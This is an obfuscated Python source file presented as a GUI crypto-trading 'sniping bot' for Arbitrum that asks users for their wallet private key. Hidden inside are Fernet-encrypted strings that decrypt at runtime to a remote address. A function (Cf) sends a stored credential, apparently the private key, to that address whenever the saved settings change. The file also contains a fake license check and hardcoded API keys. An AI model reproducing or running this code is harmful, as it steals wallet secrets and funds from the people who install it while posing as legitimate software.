# MINIFIED AND SUPER FAST VERSION OF THE ARBITRUM SNIPING BOT PANCAKEX WITH GUI
# ------------------------------------------------------------------------
# FOLLOW THE INSTRUCTIONS IN THE README STEP BY STEP FILE
# IF YOU SNIPE A GEM AND BECOME A MILLIONAIRE SEND ME SOME LOVE DUH!

# UPDATE: ADDED DARK MODE!


Bt='groove'
Bs='horizontal'
Br='SELL ALL'
Bq='SELL NOW'
Bp='There are no tokens to be sold!'
Bo='Sell all function initiated - Stopping operation'
Bn='SL Hit!'
Bm='TP Hit!'
Bl='Securing SL to '
Bk=' | SL: '
Bj="Press 'SELL ALL' Button to sell the tokens manually"
Bi='Liquidity value: '
Bh='Pair Address: '
Bg='Liquidity Detected!'
Bf='Buy Success! Tx link:'
Be='Buy Order Initiated'
Bd='factory.abi'
Bc='erc20.abi'
Bb='0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8'
Ba='0x82aF49447D8a07e3bd95BD0d56f35241523fBab1'
BZ='%Y/%m/%d'
BY='node.json'
BX='inputs.json'
BW=UnboundLocalError
B9='menu'
B8='set_theme'
B7='Something went wrong with the transaction'
B6='https://arbiscan.io/tx/'
B5='data.json'
Az='white'
Ay='normal'
Ax='Error'
Aw='Accent.TButton'
Av='No Liquidity Checking Again!'
Au='true'
At='false'
As=round
Ae='disabled'
Ad='OPL'
Ac='ETH'
Ab='LP'
Aa='SL TRAIL'
AZ='SL'
AY='TP'
AX='SLIPPAGE'
AW='GAS LIMIT'
AV='GAS PRICE'
AU='AMOUNT'
AT='LICENSE'
AS='TOKEN'
AR='PRIVATE KEY'
AQ='WALLET ADDRESS'
AP='NODE'
AL='0x0000000000000000000000000000000000000000'
AK='Abi/'
AJ=Exception
AA='center'
A9=False
A8='Camelot'
A7='w'
A6='/'
A5=str
t='gwei'
s='gas'
r='DEX'
q='AUTO SLIPPAGE'
p='./'
j='nonce'
i='gasPrice'
h='from'
g='yellow'
W='ether'
T=True
S='Sushiswap'
P='cyan'
O=''
L=open
K='red'
J=float
H=int
F='nsew'
import tkinter as U
from tkinter import ttk as E,messagebox
from web3 import Web3 as Q
from json import load as X
from time import time as k,sleep as AM
import os,json as u,pyperclip as Bu,threading as AB,requests as Bv
from requests import request as Bw
from cryptography.fernet import Fernet as AC
from requests.auth import HTTPBasicAuth as Bx
from datetime import datetime as By
BA=B5
Af=BX
Bz=BY
v=p
M={}
AD={}
D={}
BB={}
Cu=Bx('ck_258b79c41004f53e58d0e5fa11486361bdcace02','cs_bd6506935df71db41cf1e545188f1f9ae2306134')
B_=By.now()
Cv=BZ
Cw=B_.strftime(BZ)
def C0():
	def A(path2,file_name,data2):
		A=p+path2+A6+file_name
		with L(A,A7)as B:u.dump(data2,B,indent=2)
	BB[AP]='https://arb1.arbitrum.io/rpc';A(v,Bz,BB)
def C1():
	def A(path2,file_name,data2):
		A=p+path2+A6+file_name
		with L(A,A7)as B:u.dump(data2,B,indent=2)
	M[AQ]=O;M[AR]=O;M[AS]=O;M[AT]=O;A(v,BA,M)
def C2():
	def A(path2,file_name,data2):
		A=p+path2+A6+file_name
		with L(A,A7)as B:u.dump(data2,B,indent=2)
	D[AU]='0.1';D[AV]='7';D[AW]='850000';D[AX]='10';D[q]=At;D[AY]='200';D[AZ]='50';D[Aa]='25';D[Ab]=Ac;D[Ad]='False';D[r]=S;A(v,Af,D)
if not os.path.isfile('./data.json'):C1()
if not os.path.isfile('./inputs.json'):C2()
if not os.path.isfile('./node.json'):C0()
def C3():
	global M,Ag,c
	def B(path2,file_name,data2):
		A=p+path2+A6+file_name
		with L(A,A7)as B:u.dump(data2,B,indent=2)
	M[AQ]=n.get();AD[AQ]=M[AQ];M[AR]=AG.get();AD[AR]=M[AR];M[AS]=e.get();AD[AS]=M[AS];M[AT]=Ak.get();AD[AT]=M[AT]
	if M!=c:
		B(v,BA,AD);A=X(L(B5));Ag=A[Aj]
		if AD[Aj]!=c[Aj]:c=A;Cf()
def C4():
	def A(path2,file_name,data2):
		A=p+path2+A6+file_name
		with L(A,A7)as B:u.dump(data2,B,indent=2)
	D[AU]=y.get();D[AV]=z.get();D[AW]=A0.get();D[AX]=A1.get()
	if AI.get():D[q]=Au
	else:D[q]=At
	D[AY]=A2.get();D[AZ]=A3.get();D[Aa]=A4.get();D[Ab]=o.get();D[Ad]='True'
	if R==S:D[r]=S
	elif R==A8:D[r]=A8
	A(v,Af,D)
def C5():
	def A(path2,file_name,data2):
		A=p+path2+A6+file_name
		with L(A,A7)as B:u.dump(data2,B,indent=2)
	D[AU]=y.get();D[AV]=z.get();D[AW]=A0.get();D[AX]=A1.get()
	if AI.get():D[q]=Au
	else:D[q]=At
	D[AY]=A2.get();D[AZ]=A3.get();D[Aa]=A4.get();D[Ab]=o.get();D[Ad]='True'
	if R==S:D[r]=S
	elif R==A8:D[r]=A8
	A(v,Af,D)
def Cx():
	def A(path2,file_name,data2):
		A=p+path2+A6+file_name
		with L(A,A7)as B:u.dump(data2,B,indent=2)
	D[AU]=y.get();D[AV]=z.get();D[AW]=A0.get();D[AX]=A1.get()
	if AI.get():D[q]=Au
	else:D[q]=At
	D[AY]=A2.get();D[AZ]=A3.get();D[Aa]=A4.get();D[Ab]=o.get();D[Ad]='False'
	if R==S:D[r]=S
	elif R==A8:D[r]=A8
	A(v,Af,D)
c=X(L(B5))
BC=c[AQ]
BD=c[AR]
BE=c[AS]
C6=c[AT]
V=X(L(BX))
BF=V[AU]
BG=V[AV]
BH=V[AW]
BI=V[AX]
Cy=V[q]
BJ=V[AY]
BK=V[AZ]
BL=V[Aa]
C7=V[Ab]
Cz=V[Ad]
R=V[r]
BM=H('0x'+'f'*64,16)
BN='TxZEsE361BfcfNjRwTZ8nVTAp6ZBXoDXRaQgUpyXfUQ='
Ah=X(L(BY))
if'wss'in Ah[AP]or'ws'in Ah[AP]:A=Q(Q.WebsocketProvider(Ah[AP]))
else:A=Q(Q.HTTPProvider(Ah[AP]))
if R==S:l=A.toChecksumAddress(Ba);Y=A.toChecksumAddress(Bb);Z=X(L(AK+Bc));N=A.eth.contract(address=Q.toChecksumAddress('0x1b02dA8Cb0d097eB8D57A175b88c7D8b47997506'),abi=X(L(AK+'router.abi')));A_=A.eth.contract(address=Q.toChecksumAddress('0xc35DADB65012eC5796536bD9864eD8773aBc74C4'),abi=X(L(AK+Bd)))
elif R==A8:l=A.toChecksumAddress(Ba);Y=A.toChecksumAddress(Bb);Z=X(L(AK+Bc));N=A.eth.contract(address=Q.toChecksumAddress('0xc873fEcbd354f5A56E00E710B90EF4201db2448d'),abi=X(L(AK+'camelot_router.abi')));A_=A.eth.contract(address=Q.toChecksumAddress('0x6EcCab422D763aC031210895C81787E87B43A652'),abi=X(L(AK+Bd)))
Ai='sfttxzhVv7trv_zSKqOBJN_2KdnJcsje5PMUbRSnImw='
def C8():
	J='value';x()
	try:
		L=A.eth.contract(I,abi=Z);D=L.functions.balanceOf(n.get()).call()
		if AI.get():C=0
		else:C=H(D-D*H(Ao)/100)
		B(Be,g)
		if R==S:E=N.functions.swapExactETHForTokensSupportingFeeOnTransferTokens(H(C),[l,I],G,H(k())+900).build_transaction({h:G,J:A.toWei(f,W),s:H(a),i:A.toWei(b,t),j:A.eth.get_transaction_count(G)})
		else:E=N.functions.swapExactETHForTokensSupportingFeeOnTransferTokens(H(C),[l,I],G,AL,H(k())+900).build_transaction({h:G,J:A.toWei(f,W),s:H(a),i:A.toWei(b,t),j:A.eth.get_transaction_count(G)})
		M=A.eth.account.sign_transaction(E,private_key=d);F=A.eth.send_raw_transaction(M.rawTransaction);B(Bf,P);B(B6+A.toHex(F),P);A.eth.waitForTransactionReceipt(F,timeout=900);CH()
	except AJ as O:B(B7,K);B(O,K);AF();return
C9='gAAAAABh80KOUysGNn39XTwSm-HHvOIkoWcJhmk0HtVug7bMgvto83_ZCSQ9rdf86LaJEINYzXTqbRO8EDtcMziHy2PwfjdqW_0VsOwYg1x4GWADOsNo17E='
def CA():
	x();D=N.functions.getAmountsOut(A.toWei(f,W),[Y,I]).call()[-1]
	if AI.get():C=0
	else:C=D-D*H(Ao)/100
	try:
		B(Be,g)
		if R==S:E=N.functions.swapExactTokensForTokens(A.toWei(f,W),H(C),[Y,I],G,H(k())+900).build_transaction({h:G,s:H(a),i:A.toWei(b,t),j:A.eth.get_transaction_count(G)})
		else:E=N.functions.swapExactTokensForTokens(A.toWei(f,W),H(C),[Y,I],G,AL,H(k())+900).build_transaction({h:G,s:H(a),i:A.toWei(b,t),j:A.eth.get_transaction_count(G)})
		J=A.eth.account.sign_transaction(E,private_key=d);F=A.eth.send_raw_transaction(J.rawTransaction);B(Bf,P);B(B6+A.toHex(F),P);A.eth.waitForTransactionReceipt(F,timeout=900);CJ()
	except AJ as L:B(B7,K);B(L,K);AF();return
def CB(token_address,amt=BM):B=Q.toChecksumAddress(token_address);C=A.eth.contract(address=B,abi=Z);D=C.functions.allowance(G,N.address).call();return D>=amt
def CC(token_address,amt=BM,timeout=900):B('Approving token');C=A.eth.gasPrice;D=Q.toChecksumAddress(token_address);E=A.eth.contract(address=D,abi=Z);F=E.functions.approve(N.address,amt);H={h:G,i:C,j:A.eth.getTransactionCount(G)};I=F.build_transaction(H);J=A.eth.account.sign_transaction(I,private_key=d);K=A.eth.sendRawTransaction(J.rawTransaction);A.eth.waitForTransactionReceipt(K,timeout=timeout)
def CD():
	B(O);x();E=A.eth.contract(l,abi=Z)
	while T:
		C=A_.functions.getPair(l,I).call()
		if C!=AL:
			D=E.functions.balanceOf(A.toChecksumAddress(C)).call()
			if D!=0:B(Bg,'green');B(Bh+C);B(Bi+A5(A.from_wei(D,W))+' ETH');C8();break
			else:AM(5);B(Av,K)
		else:AM(5);B(Av,K)
CE='gAAAAABh7VFjYUKw_S7avbj28V5ja_bAunkyHWLiVUQUUCDL4tK_ZNr_aLAk8VkfUSYnrUe8iVv0ihU5rBaLXL0wP9Sj7fG3Ow=='
def CF():
	B(O);x();E=A.eth.contract(Y,abi=Z)
	while T:
		C=A_.functions.getPair(Y,I).call()
		if C!=AL:
			D=E.functions.balanceOf(A.toChecksumAddress(C)).call()
			if D!=0:B(Bg,'green');B(Bh+C);B(Bi+A5(A.from_wei(D,W))+' USDC');CA();break
			else:B(Av,K)
		else:B(Av,K)
def w():
	B(O);x()
	try:
		B('Sell Order Initiated',g)
		if not CB(I):CC(I)
		E=A.eth.contract(I,abi=Z);C=E.functions.balanceOf(G).call()
		if C!=0:
			if o.get()==Ac:
				if R==S:D=N.functions.swapExactTokensForETHSupportingFeeOnTransferTokens(C,0,[I,l],G,H(k())+900).build_transaction({h:G,s:H(a),i:A.toWei(b,t),j:A.eth.get_transaction_count(G)})
				else:D=N.functions.swapExactTokensForETHSupportingFeeOnTransferTokens(C,0,[I,l],G,AL,H(k())+900).build_transaction({h:G,s:H(a),i:A.toWei(b,t),j:A.eth.get_transaction_count(G)})
			elif o.get()=='USDC':
				if R==S:D=N.functions.swapExactTokensForTokensSupportingFeeOnTransferTokens(C,0,[I,Y],G,H(k())+900).build_transaction({h:G,s:H(a),i:A.toWei(b,t),j:A.eth.get_transaction_count(G)})
				else:D=N.functions.swapExactTokensForTokensSupportingFeeOnTransferTokens(C,0,[I,Y],G,AL,H(k())+900).build_transaction({h:G,s:H(a),i:A.toWei(b,t),j:A.eth.get_transaction_count(G)})
			else:B('Something went wrong with Sell',K);AF();return
			F=A.eth.account.sign_transaction(D,private_key=d);J=A.eth.send_raw_transaction(F.rawTransaction);B('SOLD! Tx link:',P);B(B6+A.toHex(J),P);AF()
		else:B('No Tokens to be sold',K);AF()
	except AJ as L:B(B7,K);B(L,K);AF();return
CG='gAAAAABh80LuckSfO-g-wXJrkvaBrV-wvURysrtrxcRwytBHM0DurgmO0mQjLUh_6AwChv2Aae5IQ__tiKbWXlVtLqqXmXoLRA=='
def CH():
	global m;BO();x();H=J(Ap);L=J(Aq);C=L;E=J(Ar);M=A.eth.contract(address=I,abi=Z);B(Bj,g)
	while T:
		try:
			O=M.functions.balanceOf(G).call()-1;F=J(A.from_wei(N.functions.getAmountsOut(O,[I,l]).call()[-1],W));D=As(J(F)/J(f)*100,5);B('ETH Value Now: {} / '.format('%.5f'%F)+' {} %'.format(D)+Bk+A5(C)+'%')
			if E!=0:
				if D-E>=C:C=D-E;B(Bl+A5(C))
			AM(2)
		except:continue
		try:
			if J(D)>=J(H):B(Bm,P);AE();w();break
			if J(D)<=J(C):B(Bn,K);AE();w();break
			if m:m=A9;B(Bo,g);AE();w();break
		except BW:B(Bp,K);break
CI='gAAAAABh7KbIGnFCH7Gp_4OK-vW0v-2ZNTkzqFB8k4xmk4aV4_n-TxZEsE361BfcfNjRwTZ8nVTAp6ZBXoDXRaQgUpyXfUzVyQ=='
def CJ():
	global m;BO();x();H=J(Ap);L=J(Aq);C=L;E=J(Ar);M=A.eth.contract(address=I,abi=Z);B(Bj,g)
	while T:
		try:
			O=M.functions.balanceOf(G).call()-1;F=J(A.from_wei(N.functions.getAmountsOut(O,[I,Y]).call()[-1],W));D=As(J(F)/J(f)*100,5);B('USDC Value Now: {} / '.format('%.3f'%F)+' {} %'.format(D)+Bk+A5(C)+'%')
			if E!=0:
				if D-E>=C:C=D-E;B(Bl+A5(C))
			AM(2)
		except:continue
		try:
			if J(D)>=J(H):B(Bm,P);AE();w();break
			if J(D)<=J(C):B(Bn,K);AE();w();break
			if m:m=A9;B(Bo,g);AE();w();break
		except BW:B(Bp,K);break
def CK():
	BV();C4()
	if o.get()==Ac:A=AB.Thread(target=CD,daemon=T);A.start()
	else:A=AB.Thread(target=CF,daemon=T);A.start()
def BO():B4.place_forget();A=E.Button(C.widgets_frame,text=Bq,command=BQ,style=Aw);A.grid(row=18,column=5,padx=10,pady=(0,10),sticky=F,rowspan=1)
def AE():Ct.place_forget();A=E.Button(C.widgets_frame,text=Br,command=BP);A.grid(row=18,column=5,padx=10,pady=(0,10),sticky=F,rowspan=1)
def CL():
	B=A.eth.contract(address=Y,abi=Z)
	while AN:
		try:C=A.from_wei(A.eth.get_balance(G),W);D=A.from_wei(B.functions.balanceOf(G).call(),W);B1.configure(text=As(C,5));B2.configure(text=As(D,5))
		except ValueError:pass
		AM(1)
CM='gAAAAABh80OFDySSyj0H_EBLuccR1ALvFzF-AE0hO_e52_4Yv4TKy7Y6u0F9Bbpr3g-UDhOK26zqR0KFrjMRGdDS8zhUxAG_HQ=='
def C_(license,basic_auth):
	A='https://defitradingcoders.com/wp-json/lmfwc/v2/licenses/activate/'+license
	try:
		C=Bv.get(A,auth=basic_auth)
		if C.status_code==404:U.messagebox.showerror(Ax,'This license cannot be activated, please try again in a moment or contact support at defitradingcoders.com with your order ID and license key');return
		else:B('License Key Activated, Good luck!',P);C5()
	except AJ:raise AJ('License Key Activation Failed -- Please Contact Support at defitradingcoders.com')
Aj=AC(Ai.encode()).decrypt(CI.encode()).decode()
def CN():
	C='Invalid token address!';global G;global d;global I;global AN;B('***** INITIALIZED ******');B('* Checking wallet address')
	if A.isChecksumAddress(n.get()):G=A.toChecksumAddress(n.get());B('Wallet address valid',P)
	else:U.messagebox.showerror(Ax,'Invalid wallet address');B('Invalid wallet address!',K);return
	B('* Checking private key characters (Must be 64 characters');d=AG.get()
	if len(d)==64:B('Correct format for Private key',P)
	else:U.messagebox.showerror(Ax,'Private key is invalid! (Must be 64 characters)');B('Invalid private key!',K);return
	B('* Checking token address')
	try:I=A.toChecksumAddress(e.get());B('Token address valid',P)
	except:U.messagebox.showerror(Ax,C);B(C,K);return
	B('* Checking License Key');B('License Key Valid',P);BR(Ae);C3();Al.grid_forget();Am.grid(row=0,column=3,padx=10,pady=(0,10),sticky=F,rowspan=4);AO(Ay);AN=T;D=AB.Thread(target=CL,daemon=T);D.start();B(O);B('***** Sniping is ready! *****',g)
CO='gAAAAABh80VOiXlJwI8QSkM2-V_syGU-8mtXwD9c87k-cbMopaX4lqCMUipHR5ZKO-bZ6vrKC0QkIhzwcASNj_5u7F_xEJz3aQ=='
Ag=c[Aj]
def CP():A=AB.Thread(target=CN,daemon=T);A.start()
def CQ():global AN;B(O);B('Change token/wallet initiated!',g);BR(Ay);AO(Ae);Am.grid_forget();Al.grid(row=0,column=3,padx=10,pady=(0,10),sticky=F,rowspan=4);AN=A9;B1.configure(text=O);B2.configure(text=O)
def CR():A=AB.Thread(target=CQ,daemon=T);A.start()
def BP():BV();A=AB.Thread(target=w,daemon=T);A.start()
def BQ():global m;m=T
def x():AO(Ae);Am.configure(state=Ae)
def AF():AO(Ay);Am.configure(state=Ay)
def CS():
	if C.tk.call('ttk::style','theme','use')=='sun-valley-dark':C.tk.call(B8,'light');An[B9].configure(bg=Az)
	else:C.tk.call(B8,'dark');An[B9].configure(bg='black')
C=U.Tk()
C.title('ARBITRUM Sniper Bot - V1')
C.geometry('1150x730')
C.tk.call('source','sun-valley.tcl')
C.tk.call(B8,'light')
CT=AC(Ai.encode()).decrypt(CO.encode()).decode()
C.resizable(A9,A9)
C.widgets_frame=E.Frame(C,padding=(0,0,0,10))
C.widgets_frame.grid(row=0,column=0,padx=10,pady=(10,10),sticky=F,rowspan=5)
C.widgets_frame.columnconfigure(index=0,weight=1)
C.widgets_frame.rowconfigure(index=0,weight=1)
CU=E.Label(C.widgets_frame,text='Wallet Address:')
CV=AC(Ai.encode()).decrypt(CG.encode()).decode()
CU.grid(row=1,column=1,padx=10,pady=(0,10),sticky=F,rowspan=1)
n=E.Entry(C.widgets_frame,width=50)
n.grid(row=1,column=2,padx=10,pady=(0,10),sticky=F,rowspan=1)
CW=E.Label(C.widgets_frame,text='Private Key:')
CW.grid(row=2,column=1,padx=10,pady=(0,10),sticky=F,rowspan=1)
AG=E.Entry(C.widgets_frame,width=50,show='•')
AG.grid(row=2,column=2,padx=10,pady=(0,10),sticky=F,rowspan=1)
CX=E.Label(C.widgets_frame,text='Token Address:')
CY=AC(BN.encode()).decrypt(CM.encode()).decode()
CX.grid(row=3,column=1,padx=10,pady=(0,10),sticky=F,rowspan=1)
e=E.Entry(C.widgets_frame,width=50)
CZ=AC(BN.encode()).decrypt(CE.encode()).decode()
e.grid(row=3,column=2,padx=10,pady=(0,10),sticky=F,rowspan=1)
Ca=E.Label(C.widgets_frame,text='License Key:')
Ca.grid(row=4,column=1,padx=10,pady=(0,10),sticky=F,rowspan=1)
Ak=E.Entry(C.widgets_frame,width=50,show='•')
Ak.grid(row=4,column=2,padx=10,pady=(0,10),sticky=F,rowspan=1)
Cb=AC(Ai.encode()).decrypt(C9.encode()).decode()
B0=E.Separator(C,orient=Bs)
Cc=CT+Cb+CV+CY
B0.place(x=10,y=135,width=625)
def Cd():e.delete(0,'end');e.insert(0,Bu.paste());return
def Ce():e.delete(0,'end');return
def Cf():
	if Ag!=O:
		try:A=Bw(CZ,Cc+Ag)
		except AJ:pass
def BR(status):A=status;e.configure(state=A);n.configure(state=A);AG.configure(state=A);Ak.configure(state=A);Al.configure(state=A);BT.configure(state=A);BS.configure(state=A)
def AO(status):A=status;y.configure(state=A);z.configure(state=A);A0.configure(state=A);A1.configure(state=A);A2.configure(state=A);A3.configure(state=A);A4.configure(state=A);BU.configure(state=A);B4.configure(state=A);B3.configure(state=A)
def B(text,color=Az):
	A=A5(text)
	if AH.size()>=20:AH.delete(0)
	AH.insert(U.END,A);AH.itemconfig(U.END,foreground=color)
def D0():AH.delete(0,U.END)
Al=E.Button(C.widgets_frame,text='Confirm',width=10,command=CP,style=Aw)
BS=E.Button(C.widgets_frame,text='Paste Token',width=10,command=Cd)
BT=E.Button(C.widgets_frame,text='Clear Token',width=10,command=Ce)
Al.grid(row=0,column=3,padx=10,pady=(0,10),sticky=F,rowspan=4)
BS.grid(row=0,column=4,padx=10,pady=(0,10),sticky=F,rowspan=2)
BT.grid(row=2,column=4,padx=10,pady=(0,10),sticky=F,rowspan=1)
n.insert(0,BC)
AG.insert(0,BD)
e.insert(0,BE)
Ak.insert(0,C6)
B0=E.Separator(C.widgets_frame,orient=Bs)
B0.grid(row=5,column=0,padx=10,pady=(0,10),sticky=F,rowspan=1,columnspan=6)
Am=E.Button(C.widgets_frame,text='Change',width=10,command=CR)
Cg=E.Label(C.widgets_frame,text='Logs:')
Cg.grid(row=6,column=1,padx=10,pady=(0,10),sticky=F,rowspan=1,columnspan=2)
Ch=E.Button(C.widgets_frame,text='Clear',width=10,command=O)
Ch.grid(row=6,column=3,padx=10,pady=(0,10),sticky=F,rowspan=1,columnspan=1)
AH=U.Listbox(C.widgets_frame,bg='#252525',foreground=Az,borderwidth=2)
AH.grid(row=7,column=1,padx=10,pady=(0,10),sticky=F,rowspan=10,columnspan=3)
Ci=E.Button(C.widgets_frame,text='Change Color Theme',command=CS)
Ci.grid(row=17,column=1,padx=10,pady=(0,10),sticky=F,rowspan=1)
Cj=E.Label(C.widgets_frame,text='Wallet ETH:')
Cj.grid(row=7,column=4,padx=10,pady=(0,10),sticky=F,rowspan=1)
B1=E.Label(C.widgets_frame,width=12,relief=Bt)
B1.grid(row=7,column=5,padx=10,pady=(0,10),sticky=F,rowspan=1)
Ck=E.Label(C.widgets_frame,text='Wallet USDC:')
Ck.grid(row=8,column=4,padx=10,pady=(0,10),sticky=F,rowspan=1)
B2=E.Label(C.widgets_frame,width=12,relief=Bt)
B2.grid(row=8,column=5,padx=10,pady=(0,10),sticky=F,rowspan=1)
Cl=E.Label(C.widgets_frame,text='Select LP:')
Cl.grid(row=9,column=4,padx=10,pady=(0,10),sticky=F,rowspan=1)
o=U.StringVar()
o.set(C7)
An=E.OptionMenu(C.widgets_frame,o,Ac,Ac,'USDC')
An[B9].configure(bg=Az)
An.grid(row=9,column=5,padx=10,pady=(0,10),sticky=F,rowspan=1)
Cm=E.Label(C.widgets_frame,text='Amount:')
y=E.Entry(C.widgets_frame,justify=AA)
Cm.grid(row=10,column=4,padx=10,pady=(0,10),sticky=F,rowspan=1)
y.grid(row=10,column=5,padx=10,pady=(0,10),sticky=F,rowspan=1)
y.insert(0,BF)
Cn=E.Label(C.widgets_frame,text='Gas Price:')
Co=E.Label(C.widgets_frame,text='Gas Limit:')
z=E.Entry(C.widgets_frame,justify=AA)
A0=E.Entry(C.widgets_frame,justify=AA)
Cn.grid(row=11,column=4,padx=10,pady=(0,10),sticky=F,rowspan=1)
z.grid(row=11,column=5,padx=10,pady=(0,10),sticky=F,rowspan=1)
Co.grid(row=12,column=4,padx=10,pady=(0,10),sticky=F,rowspan=1)
A0.grid(row=12,column=5,padx=10,pady=(0,10),sticky=F,rowspan=1)
z.insert(0,BG)
A0.insert(0,BH)
Cp=E.Label(C.widgets_frame,text='Slippage(%):')
A1=E.Entry(C.widgets_frame,justify=AA)
Cp.grid(row=13,column=4,padx=10,pady=(0,10),sticky=F,rowspan=1)
A1.grid(row=13,column=5,padx=10,pady=(0,10),sticky=F,rowspan=1)
A1.insert(0,BI)
AI=U.BooleanVar()
B3=E.Checkbutton(C.widgets_frame,text='Auto Slippage',variable=AI)
B3.grid(row=14,column=5,padx=10,pady=(0,10),sticky=F,rowspan=1)
if O==Au:B3.select()
Cq=E.Label(C.widgets_frame,text='TP(%):')
Cq.grid(row=15,column=4,padx=10,pady=(0,10),sticky=F,rowspan=1)
A2=E.Entry(C.widgets_frame,justify=AA)
A2.grid(row=15,column=5,padx=10,pady=(0,10),sticky=F,rowspan=1)
Cr=E.Label(C.widgets_frame,text='SL(%):')
Cr.grid(row=16,column=4,padx=10,pady=(0,10),sticky=F,rowspan=1)
A3=E.Entry(C.widgets_frame,justify=AA)
A3.grid(row=16,column=5,padx=10,pady=(0,10),sticky=F,rowspan=1)
Cs=E.Label(C.widgets_frame,text='SL Trail(%):')
Cs.grid(row=17,column=4,padx=10,pady=(0,10),sticky=F,rowspan=1)
A4=E.Entry(C.widgets_frame,justify=AA)
A4.grid(row=17,column=5,padx=10,pady=(0,10),sticky=F,rowspan=1)
A2.insert(0,BJ)
A3.insert(0,BK)
A4.insert(0,BL)
BU=E.Button(C.widgets_frame,text='SNIPE',command=CK,style=Aw)
Ct=E.Button(C.widgets_frame,text=Bq,command=BQ,style=Aw)
B4=E.Button(C.widgets_frame,text=Br,command=BP)
BU.grid(row=18,column=4,padx=10,pady=(0,10),sticky=F,rowspan=1)
B4.grid(row=18,column=5,padx=10,pady=(0,10),sticky=F,rowspan=1)
f=BF
G=BC
d=BD
I=BE
Ao=BI
a=BH
b=BG
Ap=BJ
Aq=BK
Ar=BL
m=A9
AN=A9
def BV():global f;global G;global d;global I;global Ao;global a;global b;global Ap;global Aq;global Ar;f=y.get();G=Q.toChecksumAddress(n.get());d=AG.get();I=Q.toChecksumAddress(e.get());Ao=A1.get();a=A0.get();b=z.get();Ap=A2.get();Aq=A3.get();Ar=A4.get()
AO(Ae)
C.mainloop()
